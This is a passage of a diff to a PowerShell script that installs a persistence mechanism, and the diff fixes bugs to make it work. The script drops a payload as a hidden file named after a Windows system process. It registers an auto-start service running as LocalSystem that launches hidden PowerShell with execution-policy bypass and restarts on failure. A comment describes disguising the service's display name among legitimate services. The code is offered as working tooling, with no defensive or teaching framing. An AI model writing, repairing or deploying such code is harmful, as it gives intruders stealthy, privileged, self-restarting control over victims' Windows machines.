@@ -200,9 +200,11 @@ $Svc4DropPath = "$DropDir\wmiprvse-helper.ps1"
 Copy-Item -Path $PayloadPath -Destination $Svc4DropPath -Force
 (Get-Item $Svc4DropPath -Force).Attributes += [System.IO.FileAttributes]::Hidden
 
-$Svc4Encoded  = Get-EncodedCommand -ScriptPath $Svc4DropPath
-# Services cannot directly run PowerShell scripts, so we wrap in cmd.exe
-$Svc4BinPath  = "cmd.exe /c start /min powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $Svc4Encoded"
+# Point the service directly at powershell.exe -File <dropped script>.
+# Using cmd.exe /c start /min would exit immediately (cmd exits after spawning),
+# causing the SCM to see the service as stopped and restart it in a tight loop.
+$psExe       = "$Env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+$Svc4BinPath = "`"$psExe`" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$Svc4DropPath`""
 
 # Remove if already exists
 $existingSvc = Get-Service -Name $Svc4Name -ErrorAction SilentlyContinue
@@ -212,12 +214,12 @@ if ($existingSvc) {
     Start-Sleep -Seconds 2
 }
 
-sc.exe create $Svc4Name `
-    binPath= $Svc4BinPath `
-    start=   auto `
-    obj=     LocalSystem | Out-Null
+# sc.exe requires a space after each '=' and the binPath value must be quoted
+# when it contains spaces. Backtick line-continuation prepends whitespace before
+# each keyword which confuses sc.exe's parser — keep it on one line.
+sc.exe create $Svc4Name binPath= "$Svc4BinPath" start= auto obj= LocalSystem | Out-Null
 
-sc.exe description $Svc4Name $Svc4Desc | Out-Null
+sc.exe description $Svc4Name "$Svc4Desc" | Out-Null
 sc.exe failure      $Svc4Name reset= 60 actions= restart/5000//5000//5000 | Out-Null
 
 # Blend the display name into the SCM list
